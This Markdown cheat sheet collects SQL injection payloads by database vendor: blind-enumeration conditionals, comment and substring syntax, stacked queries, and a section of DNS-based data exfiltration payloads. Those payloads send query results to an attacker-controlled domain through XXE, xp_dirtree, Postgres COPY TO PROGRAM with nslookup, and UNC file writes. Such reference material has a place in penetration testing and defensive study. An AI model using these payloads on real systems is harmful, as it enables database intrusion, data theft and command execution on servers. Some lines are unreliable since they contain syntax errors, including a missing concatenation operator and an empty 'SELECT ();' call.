# SQL Injection
## Useful Wins
- `SELECT * FROM `
## Conditionals
**Useful for blind enumeration of DB contents**
- Oracle - `SELECT CASE WHEN (<CONDITION>) THEN <TRUE> ELSE <FALSE> END FROM dual`
- Microsoft - `IF (<CONDITION>) <TRUE> [<FALSE>]`
- Microsoft / Postgres - `SELECT CASE WHEN (<CONDITION>) THEN <TRUE> ELSE <FALSE>`
- MySql / MariaDb - `SELECT IF (<CONDITION>, <TRUE>, <FALSE>)`

## Comments
- Oracle / Microsoft / Postgres - `--COMMENT` `/*COMMENT*/`
- MySQL / MariaDb - `#COMMENT` `-- COMMENT` `/*COMMENT*/`

## Substring
- Oracle - `SUBSTR('foobar', 4, 2)`
- Microsoft / Postgres / MySql / MariaDb - `SUBSTRING('foobar', 4, 2)`

## Stacked Queries
- Oracle - None
- Microsoft / Postgres / MySql / MariaDb - `<QUERY1>;<QUERY2>`

## DNS with Data Exfiltration
- Oracle - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||<QUERY>||'.<DOMAIN>/"> %remote;]>'),'/l') FROM dual`
- Microsoft - `declare @p varchar(1024);set @p=(<QUERY>);exec('master..xp_dirtree "//'+@p'.<DOMAIN>/a"')`
- Postgres - `create OR replace function f() returns void as $$;declare c text; declare p text; begin; SELECT into p (<QUERY>); c := 'copy (SELECT '''') to program ''nslookup '||p||'.<DOMAIN>''';execute c;END;$$ language plpgsql security definer; SELECT ();`
- MySql / MariaDb (Windows only) - `<QUERY> INTO OUTFILE '\\\\<DOMAIN>\a'`